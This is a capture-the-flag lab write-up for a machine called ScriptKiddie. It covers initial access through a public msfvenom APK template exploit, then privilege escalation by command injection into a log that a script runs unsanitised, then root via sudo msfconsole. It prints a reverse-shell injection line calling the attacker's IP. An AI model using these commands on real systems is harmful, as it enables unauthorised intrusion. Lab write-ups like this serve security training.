# ScriptKiddie

## Gaining Access

Nmap scan:

<figure><img src="../../../.gitbook/assets/image (3529).png" alt=""><figcaption></figcaption></figure>

### Hacker Tools

Port 5000 presented a website where we could use tools like `nmap` and `msfvenom`:

<figure><img src="../../../.gitbook/assets/image (748).png" alt=""><figcaption></figcaption></figure>

We can try it out and it works:

<figure><img src="../../../.gitbook/assets/image (3663).png" alt=""><figcaption></figcaption></figure>

I tested all forms of command injection, but nothing worked. So, I started checking whether the tools themselves had exploits, and I was surprised to see that `msfvenom` was exploitable:

{% embed url="https://www.exploit-db.com/exploits/49491" %}

We just need to replace the payload in the PoC to a reverse shell and generate the APK file:

<figure><img src="../../../.gitbook/assets/image (2452).png" alt=""><figcaption></figcaption></figure>

Afterwards, we can upload this as a template file on the machine and change the LHOST to our IP address:

<figure><img src="../../../.gitbook/assets/image (2606).png" alt=""><figcaption></figcaption></figure>

Then we would get a shell:

<figure><img src="../../../.gitbook/assets/image (410).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### To Pwn

There was another user named `pwn` on the machine, so that's probably the next path. Within the home directory of `pwn`, we can see two other files:

<figure><img src="../../../.gitbook/assets/image (2863).png" alt=""><figcaption></figcaption></figure>

The `bash` script was running some kind of logger that reads input from `/home/kid/logs/hackers` and executes commands based on it. Take note that we have control over this file.

<figure><img src="../../../.gitbook/assets/image (2331).png" alt=""><figcaption></figcaption></figure>

Now, we can see how the `${ip}` variable is not being sanitised and is run with `sh -c`, so this is our RCE point. Some testing revealed that the format of the log written is `[2021-05-28 12:37:32.655374] 10.10.16.9`. We can append a reverse shell to the end:

{% code overflow="wrap" %}
```
[2021-05-28 12:37:32.655374] 10.10.16.9 | bash -c 'bash -i >& /dev/tcp/10.10.16.9/8080 0>&1' #" > /home/kid/logs/hackers
```
{% endcode %}

After echoing it in, we would gain anoter reverse shell:

<figure><img src="../../../.gitbook/assets/image (3674).png" alt=""><figcaption></figcaption></figure>

### Sudo MSFConsole

When checking `sudo` privileges, we see that we can run `msfconsole` as root.

<figure><img src="../../../.gitbook/assets/image (3474).png" alt=""><figcaption></figcaption></figure>

The thing about `msfconsole` is that we can run shell commands in it. In short, we have root privileges just by doing `sudo msfconsole`:

<figure><img src="../../../.gitbook/assets/image (1874).png" alt=""><figcaption></figcaption></figure>

Rooted!
